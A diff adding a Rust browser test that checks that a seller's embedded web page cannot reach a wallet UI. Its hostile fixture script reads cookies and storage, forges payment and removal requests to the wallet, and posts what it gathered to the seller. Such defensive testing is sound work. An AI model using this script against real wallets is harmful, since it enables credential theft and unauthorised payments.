@@ -1,0 +1,366 @@
+//! A seller's own web page, used inside the app (docs/SELLER-APPS.md), in headless Chrome
+//! (tests/js/seller_app_test.mjs): the real UI and its app ports, the real connector, and a
+//! stand-in signer behind it that asks the seller as the real one does once it is paid. Three
+//! stand-in sellers' pages:
+//!
+//! * a chat page like llama.cpp's server's: its page served only compressed, and an answer streamed
+//!   as server-sent events;
+//! * a media server's web client like Jellyfin's: a login that sets a cookie and keeps a token in
+//!   the page's storage, then a request with its login header;
+//! * a hostile page, which tries to read the wallet's cookies and storage, to have the wallet pay
+//!   for a stream, to act on the wallet, and to open a wallet page; it reports what it got.
+//!
+//! Skipped (with a note) when node or Chrome is missing, except under CI. Screenshots: OUT
+//! (`$XBT_UI_SNAPSHOT_DIR`, default `target/ui-seller-app`).
+#[path = "../../xbt-signer/tests/common/mod.rs"]
+mod common;
+
+use std::io::{BufRead, BufReader, Read, Write};
+use std::os::unix::net::{UnixListener, UnixStream};
+use std::path::{Path, PathBuf};
+use std::sync::{Arc, Mutex};
+use std::time::Duration;
+
+use common::*;
+use serde_json::{json, Value};
+use xbt_svc::http::{Reply, Request, Response, Streamed};
+use xbt_wallet_ui::app::App;
+use xbt_wallet_ui::config::Config;
+
+fn find(cands: &[String]) -> Option<String> {
+    cands.iter().find(|c| std::process::Command::new(c).arg("--version").output().is_ok_and(|o| o.status.success())).cloned()
+}
+
+const CHAT_PAGE: &str = "<!doctype html><meta charset=\"utf-8\"><title>chat</title><h1>A model's chat page</h1><div id=\"out\"></div><script src=\"./chat.js\"></script>";
+const CHAT_JS: &str = r#"(async () => {
+  const r = await fetch("./v1/chat/completions", { method: "POST", headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ stream: true, messages: [{ role: "user", content: "hi" }] }) });
+  const rd = r.body.getReader(); const dec = new TextDecoder(); let buf = "";
+  for (;;) {
+    const { value, done } = await rd.read(); if (done) break;
+    buf += dec.decode(value, { stream: true }); let i;
+    while ((i = buf.indexOf("\n\n")) >= 0) {
+      const ev = buf.slice(0, i); buf = buf.slice(i + 2);
+      if (ev.startsWith("data: ") && ev.slice(6) !== "[DONE]") {
+        const d = JSON.parse(ev.slice(6)); const t = d.choices && d.choices[0] && d.choices[0].delta && d.choices[0].delta.content;
+        if (t) document.getElementById("out").textContent += t;
+      }
+    }
+  }
+  document.title = "chat-done";
+})().catch((e) => { document.title = "chat-failed " + e; });"#;
+const JF_PAGE: &str = "<!doctype html><meta charset=\"utf-8\"><title>jf</title><h1>A media server's web client</h1><ul id=\"items\"></ul><script src=\"main.js\"></script>";
+const JF_JS: &str = r#"(async () => {
+  const a = await fetch("../Users/AuthenticateByName", { method: "POST", headers: { "Content-Type": "application/json", "X-Emby-Authorization": "MediaBrowser Client=\"web\"" },
+    body: JSON.stringify({ Username: "guest", Pw: "guest" }) });
+  const j = await a.json(); localStorage.setItem("jf_token", j.AccessToken);
+  const r = await fetch("../Items", { headers: { "X-Emby-Authorization": "MediaBrowser Token=\"" + j.AccessToken + "\"" } });
+  if (!r.ok) throw new Error("items " + r.status);
+  for (const it of (await r.json()).Items) { const li = document.createElement("li"); li.textContent = it.Name; document.getElementById("items").appendChild(li); }
+  document.title = "jf-done";
+})().catch((e) => { document.title = "jf-failed " + e; });"#;
+const EVIL_PAGE: &str = "<!doctype html><meta charset=\"utf-8\"><title>evil</title><p>Nothing to see.</p><script src=\"./evil.js\"></script>";
+const EVIL_JS: &str = r#"(async () => {
+  const w = new URLSearchParams(location.search).get("w");
+  const rep = { cookie: document.cookie, storage: Object.keys(localStorage) };
+  try { rep.parent = window.parent.document.title; } catch (e) { rep.parent = "blocked"; }
+  try { rep.parentStorage = window.parent.localStorage.length; } catch (e) { rep.parentStorage = "blocked"; }
+  try { await fetch(w + "/s/https://seller.invalid/evil-film", { mode: "no-cors", credentials: "include" }); } catch (e) { /* refused */ }
+  try { await fetch(w + "/services", { method: "POST", mode: "no-cors", credentials: "include", headers: { "Content-Type": "application/x-www-form-urlencoded" },
+    body: "action=remove&url=" + encodeURIComponent(location.origin) }); } catch (e) { /* refused */ }
+  try { const r = await fetch(w + "/api/visit?v=00", { credentials: "include" }); rep.readWallet = await r.text(); } catch (e) { rep.readWallet = "blocked"; }
+  try { rep.popup = String(!!window.open(w + "/sell")); } catch (e) { rep.popup = "blocked"; }
+  const v = document.createElement("video"); v.src = w + "/s/https://seller.invalid/evil-video"; document.body.appendChild(v);
+  await new Promise((r) => setTimeout(r, 500));
+  await fetch("./report", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(rep) });
+  document.title = "evil-done";
+})().catch((e) => { document.title = "evil-failed " + e; });"#;
+
+/// The stand-in sellers' service: the three pages, and what the hostile one reported.
+struct Seller {
+    report: Arc<Mutex<Option<Value>>>,
+}
+
+impl xbt_svc::http::Handler for Seller {
+    fn body_limit(&self, _m: &str, _t: &str) -> usize {
+        1 << 16
+    }
+
+    fn handle(&self, _r: Request) -> Response {
+        Response::text(500, "text/plain", "unused")
+    }
+
+    fn reply(&self, req: Request) -> Reply {
+        let path = req.path().to_string();
+        let ok = |t: &str, b: &str| Reply::Whole(Response::new(200, vec![("Content-Type".into(), t.into())], b.as_bytes().to_vec()));
+        match (req.method.as_str(), path.as_str()) {
+            // as llama.cpp's server: the page only compressed
+            ("GET", "/app/") => {
+                if !req.header("Accept-Encoding").is_some_and(|a| a.contains("gzip")) {
+                    return Reply::Whole(Response::text(415, "text/plain", "Error: gzip is not supported by this browser"));
+                }
+                let mut z = flate2::write::GzEncoder::new(vec![], flate2::Compression::default());
+                z.write_all(CHAT_PAGE.as_bytes()).unwrap();
+                Reply::Whole(Response::new(200, vec![("Content-Type".into(), "text/html; charset=utf-8".into()), ("Content-Encoding".into(), "gzip".into())],
+                                           z.finish().unwrap()))
+            }
+            ("GET", "/app/chat.js") => ok("text/javascript", CHAT_JS),
+            ("POST", "/app/v1/chat/completions") => Reply::Stream(Streamed { status: 200, headers: vec![("Content-Type".into(), "text/event-stream".into())], length: None,
+                body: Box::new(|out| {
+                    for t in ["Hello", " from", " the", " model"] {
+                        out.send(format!("data: {}\n\n", json!({"choices": [{"delta": {"content": t}}]})).as_bytes())?;
+                        std::thread::sleep(Duration::from_millis(60));
+                    }
+                    out.send(b"data: [DONE]\n\n")
+                }) }),
+            ("GET", "/jf/web/") => ok("text/html; charset=utf-8", JF_PAGE),
+            ("GET", "/jf/web/main.js") => ok("text/javascript", JF_JS),
+            ("POST", "/jf/Users/AuthenticateByName") => Reply::Whole(Response::new(200, vec![("Content-Type".into(), "application/json".into()),
+                ("Set-Cookie".into(), "jfsess=s1; Path=/; HttpOnly; Secure; SameSite=None; Domain=seller.invalid".into())], json!({"AccessToken": "tok-123"}).to_string().into_bytes())),
+            ("GET", "/jf/Items") => {
+                let login = req.header("X-Emby-Authorization").is_some_and(|a| a.contains("tok-123"));
+                let cookie = req.header("Cookie").is_some_and(|c| c.split(';').any(|x| x.trim() == "jfsess=s1"));
+                if !(login && cookie) {
+                    return Reply::Whole(Response::text(401, "text/plain", format!("login {login} cookie {cookie}")));
+                }
+                Reply::Whole(Response::new(200, vec![("Content-Type".into(), "application/json".into())],
+                                           json!({"Items": [{"Name": "Big Buck Bunny"}, {"Name": "Sintel"}]}).to_string().into_bytes()))
+            }
+            ("GET", "/evil/") => ok("text/html; charset=utf-8", EVIL_PAGE),
+            ("GET", "/evil/evil.js") => ok("text/javascript", EVIL_JS),
+            ("POST", "/evil/report") => {
+                *self.report.lock().unwrap() = serde_json::from_slice(&req.body).ok();
+                ok("application/json", "{}")
+            }
+            _ => Reply::Whole(Response::text(404, "text/plain", "no such page")),
+        }
+    }
+}
+
+/// A stand-in signer for the connector: each `xbt402_pay` asked of the seller as the real signer
+/// asks once it has paid (the method, the caller's headers and body, the seller's head and body
+/// back, the head line first), and every URL it was asked for, kept.
+fn signer(dir: &Path) -> (PathBuf, Arc<Mutex<Vec<String>>>) {
+    let sock = dir.join("pay.sock");
+    let l = UnixListener::bind(&sock).unwrap();
+    let streams = dir.to_path_buf();
+    let urls = Arc::new(Mutex::new(vec![]));
+    let u2 = urls.clone();
+    std::thread::spawn(move || {
+        for conn in l.incoming() {
+            let mut conn = conn.unwrap();
+            let (streams, urls) = (streams.clone(), u2.clone());
+            std::thread::spawn(move || {
+                let mut line = String::new();
+                BufReader::new(conn.try_clone().unwrap()).read_line(&mut line).unwrap();
+                let req: Value = serde_json::from_str(&line).unwrap();
+                if req["method"] != "xbt402_pay" {
+                    let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"ready": true}}));
+                    return;
+                }
+                let p = &req["params"];
+                let url = p["url"].as_str().unwrap().to_string();
+                urls.lock().unwrap().push(url.clone());
+                let agent = ureq::AgentBuilder::new().redirects(0).build();
+                let mut r = agent.request(p["method"].as_str().unwrap_or("GET"), &url);
+                for h in p["headers"].as_array().into_iter().flatten() {
+                    r = r.set(h[0].as_str().unwrap(), h[1].as_str().unwrap());
+                }
+                use base64::Engine as _;
+                let body = p["body_b64"].as_str().map(|b| base64::engine::general_purpose::STANDARD.decode(b).unwrap()).unwrap_or_default();
+                let resp = match if body.is_empty() { r.call() } else { r.send_bytes(&body) } {
+                    Ok(x) | Err(ureq::Error::Status(_, x)) => x,
+                    Err(e) => {
+                        let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"verdict": "deny", "rule": "xbt402", "reason": e.to_string()}}));
+                        return;
+                    }
+                };
+                let mut headers = vec![];
+                for n in resp.headers_names() {
+                    if !["content-length", "transfer-encoding", "connection"].contains(&n.to_ascii_lowercase().as_str()) {
+                        for v in resp.all(&n) {
+                            headers.push(json!([n, v]));
+                        }
+                    }
+                }
+                let head = json!({"status": resp.status(), "content_type": resp.header("content-type"), "headers": headers});
+                let mut out = UnixStream::connect(streams.join(p["stream_to"].as_str().unwrap())).unwrap();
+                let _ = writeln!(out, "{head}");
+                let mut src = resp.into_reader();
+                let mut buf = [0u8; 8192];
+                while let Ok(n) = src.read(&mut buf) {
+                    if n == 0 || out.write_all(&buf[..n]).is_err() {
+                        break;
+                    }
+                }
+                drop(out);
+                let _ = writeln!(conn, "{}", json!({"id": 1, "result": {"verdict": "allow", "status": 200, "charged_sats": 0, "complete": true}}));
+            });
+        }
+    });
+    (sock, urls)
+}
+
+fn free_port() -> u16 {
+    std::net::TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port()
+}
+
+#[test]
+fn a_sellers_own_page_works_inside_the_app_and_cannot_reach_the_wallet() {
+    let home = std::env::var("HOME").unwrap_or_default();
+    let (Some(node), Some(chrome)) = (find(&["node".into(), format!("{home}/.local/share/nodejs/bin/node")]),
+                                      find(&[std::env::var("CHROME").unwrap_or_else(|_| "google-chrome".into()), "chromium".into(), "chromium-browser".into()])) else {
+        assert!(std::env::var_os("CI").is_none(), "node or chrome not found, and CI must have both (CHROME={:?})", std::env::var("CHROME"));
+        return eprintln!("node or chrome not found: skipped");
+    };
+    let _e = ENV.lock().unwrap_or_else(|p| p.into_inner());
+    // the sellers
+    let report = Arc::new(Mutex::new(None));
+    let sl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let seller = format!("http://{}", sl.local_addr().unwrap());
+    let srun = xbt_svc::http::serve(Arc::new(Seller { report: report.clone() }), sl, 16).unwrap();
+    // the connector, paying through the stand-in signer
+    let dir = tempfile::tempdir().unwrap();
+    let (pay_sock, paid_urls) = signer(dir.path());
+    let cl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let crun = lightning_stream::serve(lightning_stream::Config { signer: pay_sock, stream_dir: dir.path().to_path_buf(), task: "app".into(), max_sats: 2_000 }, cl).unwrap();
+    // the UI, with its own (real) signer for its pages
+    let rig = Rig::new(json!({"human_pubkey": ""}), true);
+    let sock_path = rig.dir.path().join("signer.sock");
+    let _sock = xbt_signer::server::spawn(rig.s.clone(), &sock_path, false).unwrap();
+    let data = tempfile::tempdir().unwrap();
+    let ui_port = free_port();
+    let mut cfg = Config::for_test(sock_path, data.path().join("ui"), &format!("127.0.0.1:{ui_port}"));
+    cfg.connector = format!("http://{}", crun.addr);
+    cfg.app_ports = vec![free_port(), free_port()];
+    let wallet = format!("http://127.0.0.1:{ui_port}");
+    std::fs::create_dir_all(data.path().join("ui")).unwrap();
+    let services = json!([
+        {"name": "A model", "kind": "ai", "seller": seller, "price_text": "10 sat per 1,000 tokens", "items": [],
+         "app": format!("{seller}/app/"), "app_base": format!("{seller}/app/")},
+        {"name": "Films", "kind": "video", "seller": seller, "price_text": "20 sat a MiB", "items": [],
+         "app": format!("{seller}/jf/web/"), "app_base": format!("{seller}/jf/")},
+        {"name": "A game", "kind": "api", "seller": seller, "price_text": "1 sat a request", "items": [],
+         "app": format!("{seller}/evil/?w={wallet}"), "app_base": format!("{seller}/evil/")}
+    ]);
+    std::fs::write(data.path().join("ui/services.json"), services.to_string()).unwrap();
+    let services_before = std::fs::read_to_string(data.path().join("ui/services.json")).unwrap();
+    let app = App::new(cfg).unwrap();
+    let srv = xbt_wallet_ui::server::spawn(app).unwrap();
+    assert_eq!(srv.app_ports.len(), 2);
+    let policy_before = rig.call("policy_get", json!({}))["sha256"].clone();
+    let code = std::fs::read_to_string(data.path().join("ui/setup-code")).unwrap();
+    let out = std::env::var("XBT_UI_SNAPSHOT_DIR").unwrap_or_else(|_| concat!(env!("CARGO_MANIFEST_DIR"), "/../../target/ui-seller-app").into());
+    let enc = |s: &str| xbt_wallet_ui::services::urlenc(s);
+    let opens = json!({
+        "chat": format!("/app?u={}&b={}", enc(&format!("{seller}/app/")), enc(&format!("{seller}/app/"))),
+        "jf": format!("/app?u={}&b={}", enc(&format!("{seller}/jf/web/")), enc(&format!("{seller}/jf/"))),
+        "evil": format!("/app?u={}&b={}", enc(&format!("{seller}/evil/?w={wallet}")), enc(&format!("{seller}/evil/"))),
+    });
+    let o = std::process::Command::new(node).env("CHROME", chrome)
+        .args([concat!(env!("CARGO_MANIFEST_DIR"), "/tests/js/seller_app_test.mjs"), &wallet, code.trim(), &out, &opens.to_string()])
+        .output().unwrap();
+    let text = String::from_utf8_lossy(&o.stdout);
+    eprintln!("{text}");
+    assert!(o.status.success(), "{text}{}", String::from_utf8_lossy(&o.stderr));
+    // what the hostile page got: none of the wallet's cookies or storage, nothing of the wallet's answers
+    let rep = report.lock().unwrap().clone().expect("the hostile page reported");
+    let cookie = rep["cookie"].as_str().unwrap_or("");
+    assert!(!cookie.contains("xbt_ui") && !cookie.contains("__ls_visit"), "the page read a wallet cookie: {rep}");
+    assert!(rep["storage"].as_array().is_some_and(|a| !a.iter().any(|k| k.as_str().unwrap_or("").starts_with("xbt-wallet"))), "{rep}");
+    assert_eq!((rep["parent"].as_str(), rep["parentStorage"].as_str()), (Some("blocked"), Some("blocked")), "{rep}");
+    assert!(!rep["readWallet"].as_str().unwrap_or("").contains("ended"), "the page read a wallet answer: {rep}");
+    // no stream was paid at its word, and nothing on the wallet changed
+    let urls = paid_urls.lock().unwrap().clone();
+    assert!(!urls.iter().any(|u| u.contains("evil-film") || u.contains("evil-video")), "the wallet paid at the hostile page's word: {urls:?}");
+    assert!(urls.iter().all(|u| u.starts_with(&seller)), "{urls:?}");
+    assert_eq!(std::fs::read_to_string(data.path().join("ui/services.json")).unwrap(), services_before, "the hostile page changed the wallet's sellers");
+    assert_eq!(rig.call("policy_get", json!({}))["sha256"], policy_before);
+    drop(srun);
+}
+
+/// The app port without a browser: it serves nothing without its visit's cookie; the one-time code
+/// is good once and on its own port only; the cookie works on that port alone; the wallet's
+/// cookies never reach the seller; a stopped visit pays nothing more.
+#[test]
+fn an_app_port_serves_only_the_visit_whose_cookie_it_gave() {
+    let _e = ENV.lock().unwrap_or_else(|p| p.into_inner());
+    let sl = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
+    let seller = format!("http://{}", sl.local_addr().unwrap());
+    let _srun = xbt_svc::http::serve(Arc::new(Seller { report: Arc::new(Mutex::new(None)) }), sl, 8).unwrap();
+    let dir = tempfile::tempdir().unwrap();
+    let (pay_sock, paid_urls) = signer(dir.path());
+    let crun = lightning_stream::serve(lightning_stream::Config { signer: pay_sock, stream_dir: dir.path().to_path_buf(), task: "app".into(), max_sats: 2_000 },
+                                       std::net::TcpListener::bind("127.0.0.1:0").unwrap()).unwrap();
+    let rig = Rig::new(json!({}), true);
+    let sock_path = rig.dir.path().join("signer.sock");
+    let _sock = xbt_signer::server::spawn(rig.s.clone(), &sock_path, false).unwrap();
+    let data = tempfile::tempdir().unwrap();
+    let mut cfg = Config::for_test(sock_path, data.path().join("ui"), "127.0.0.1:0");
+    cfg.connector = format!("http://{}", crun.addr);
+    let (pa, pb) = (free_port(), free_port());
+    cfg.app_ports = vec![pa, pb];
+    std::fs::create_dir_all(data.path().join("ui")).unwrap();
+    let base = format!("{seller}/jf/");
+    std::fs::write(data.path().join("ui/services.json"), json!([{"name": "Films", "kind": "video", "seller": seller, "price_text": "20 sat a MiB", "items": [],
+        "app": format!("{seller}/jf/web/"), "app_base": base}]).to_string()).unwrap();
+    let srv = xbt_wallet_ui::server::spawn(App::new(cfg).unwrap()).unwrap();
+    let wallet = format!("http://{}", srv.addr);
+    let agent = ureq::AgentBuilder::new().redirects(0).build();
+    let send = |method: &str, url: &str, cookie: &str, body: Option<&str>| -> (u16, Vec<(String, String)>, String) {
+        let mut r = agent.request(method, url);
+        if !cookie.is_empty() {
+            r = r.set("Cookie", cookie);
+        }
+        let resp = match match body { Some(b) => r.set("Content-Type", "application/x-www-form-urlencoded").send_string(b), None => r.call() } {
+            Ok(x) | Err(ureq::Error::Status(_, x)) => x,
+            Err(e) => panic!("{url}: {e}"),
+        };
+        let headers = resp.headers_names().iter().flat_map(|n| resp.all(n).into_iter().map(|v| (n.to_ascii_lowercase(), v.to_string())).collect::<Vec<_>>()).collect();
+        (resp.status(), headers, resp.into_string().unwrap_or_default())
+    };
+    let cookie_of = |h: &[(String, String)], name: &str| h.iter().filter(|(k, _)| k == "set-cookie").find_map(|(_, v)| v.split(';').next().filter(|c| c.starts_with(name)).map(str::to_string));
+    // the owner's session
+    let code = std::fs::read_to_string(data.path().join("ui/setup-code")).unwrap();
+    let (st, h, _) = send("POST", &format!("{wallet}/setup-password"), "", Some(&format!("code={}&password=a+long+box+password&password2=a+long+box+password", code.trim())));
+    assert_eq!(st, 303);
+    let session = cookie_of(&h, "xbt").expect("a session cookie");
+    let field = |page: &str, attr: &str| { let i = page.find(&format!("{attr}=\"")).unwrap() + attr.len() + 2; page[i..i + page[i..].find('"').unwrap()].to_string() };
+    let enc = xbt_wallet_ui::services::urlenc;
+    let (_, _, page) = send("GET", &format!("{wallet}/app?u={}&b={}", enc(&format!("{seller}/jf/web/")), enc(&base)), &session, None);
+    let csrf = { let i = page.find("name=\"csrf\" value=\"").unwrap() + 19; page[i..i + page[i..].find('"').unwrap()].to_string() };
+    let (st, _, page) = send("POST", &format!("{wallet}/app"), &session,
+                             Some(&format!("csrf={csrf}&u={}&b={}&limit=900", enc(&format!("{seller}/jf/web/")), enc(&base))));
+    assert_eq!(st, 200, "{page}");
+    let (visit, port, code) = (field(&page, "data-visit"), field(&page, "data-port").parse::<u16>().unwrap(), field(&page, "data-code"));
+    let other = if port == pa { pb } else { pa };
+    // nothing without the cookie, and the code is good on its own port only, once
+    assert_eq!(send("GET", &format!("http://127.0.0.1:{port}/web/"), &session, None).0, 403);
+    assert_eq!(send("GET", &format!("http://127.0.0.1:{other}/__ls/enter?c={code}"), "", None).0, 403);
+    let (st, h, _) = send("GET", &format!("http://127.0.0.1:{port}/__ls/enter?c={code}"), "", None);
+    assert_eq!((st, h.iter().find(|(k, _)| k == "location").map(|(_, v)| v.as_str())), (302, Some("/web/")));
+    let visit_cookie = cookie_of(&h, "__ls_visit_").expect("the port's cookie");
+    assert!(h.iter().any(|(k, v)| k == "set-cookie" && v.contains("HttpOnly") && v.contains("SameSite=Strict")));
+    assert_eq!(send("GET", &format!("http://127.0.0.1:{port}/__ls/enter?c={code}"), "", None).0, 403, "a code is good once");
+    // with it: the page, through the visit; the wallet's cookie is not passed on
+    let both = format!("{session}; {visit_cookie}");
+    let (st, _, body) = send("GET", &format!("http://127.0.0.1:{port}/web/"), &both, None);
+    assert!(st == 200 && body.contains("media server"), "{st} {body}");
+    assert_eq!(send("GET", &format!("http://127.0.0.1:{other}/web/"), &both, None).0, 403, "a port's cookie is no good on another port");
+    // the seller's cookie comes back under the port's prefix, made plain http, and goes back to the seller as it set it
+    let (st, h, _) = send("POST", &format!("http://127.0.0.1:{port}/Users/AuthenticateByName"), &both, Some("{}"));
+    assert_eq!(st, 200);
+    let sc = h.iter().find(|(k, _)| k == "set-cookie").map(|(_, v)| v.clone()).unwrap();
+    assert!(sc.starts_with(&format!("lsa{port}_")) && sc.contains("jfsess=s1") && !sc.contains("Secure") && !sc.contains("Domain"), "{sc}");
+    let jar = format!("{both}; {}", sc.split(';').next().unwrap());
+    let r = agent.get(&format!("http://127.0.0.1:{port}/Items")).set("Cookie", &jar).set("X-Emby-Authorization", "MediaBrowser Token=\"tok-123\"").call();
+    assert_eq!(r.map(|x| x.status()).unwrap_or_else(|e| match e { ureq::Error::Status(c, _) => c, _ => 0 }), 200, "the seller got its cookie back, and its login header");
+    assert!(paid_urls.lock().unwrap().iter().all(|u| u.starts_with(&base)), "only the page's own base was asked for");
+    // Stop: the next request pays nothing, and says so
+    let calls = paid_urls.lock().unwrap().len();
+    let (st, _, _) = send("POST", &format!("{wallet}/app-stop"), &session, Some(&format!("csrf={csrf}&visit={visit}")));
+    assert_eq!(st, 303);
+    let (st, _, _) = send("GET", &format!("http://127.0.0.1:{port}/web/"), &both, None);
+    assert_eq!(st, 403, "the stopped visit's cookie is gone");
+    assert_eq!(paid_urls.lock().unwrap().len(), calls);
+}
